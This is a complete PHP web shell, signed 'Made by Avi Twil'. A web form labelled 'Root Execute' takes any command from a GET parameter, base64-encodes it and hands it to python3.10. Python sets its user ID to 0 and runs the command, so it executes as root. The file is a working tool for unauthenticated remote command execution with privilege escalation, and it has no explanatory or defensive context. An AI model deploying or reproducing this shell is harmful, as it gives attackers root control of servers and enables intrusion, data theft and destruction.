<html>
<body>
      <h1> Made by Avi Twil</h1>
    <form method="GET">
        <input type="TEXT" name="cmd" autofocus size="80">
        <input type="SUBMIT" value="Root Execute">
    </form>
    <pre>
<?php
    if(isset($_GET["cmd"])) {
        $c = base64_encode($_GET["cmd"]);
        system("/usr/bin/python3.10 -c 'import os,base64; os.setuid(0); os.system(base64.b64decode(\"$c\").decode())'");
    }
?>
    </pre>
</body>
</html>
